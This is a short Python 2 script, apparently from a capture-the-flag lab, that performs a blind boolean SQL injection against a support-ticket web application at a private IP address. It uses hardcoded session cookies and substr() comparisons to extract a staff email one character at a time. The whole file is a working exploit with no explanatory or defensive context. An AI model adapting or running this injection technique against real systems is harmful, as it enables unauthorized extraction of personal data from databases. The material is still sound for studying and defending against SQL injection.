#!/usr/bin/env python2
# exploit_sqli_email.pyt

import requests
import string

debug = False

URL = "http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6"
cookies = {'lang':'english', 'PHPSESSID':'v423t14bjk1ka4uhak0n7nafs2', 'usrhash':'0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BH4YDWjCMH7IkEQTDosp6gVjbF3t7oujb1ONw2JChT1Rw%3D%3D'}
chars = list(string.ascii_lowercase) + list(string.digits) + list(['@', '.', '_', '-'])
if debug:
    print(chars)

def main():
    passwords = []
    for lim in range(1,100):
        for c in chars:
            payloads = URL + " and substr((select email from staff limit 0,1)," +str(lim)+",1) = '"+str(c)+ "'-- -"
            response = requests.get(payloads, cookies = cookies).content
            if "404" not in response:
                passwords.append(c)
                lim = lim + 1
                break
            if debug:
                print(payloads)
                print(c)
        print("email : " + "".join(passwords))


if __name__ == '__main__':
    main()
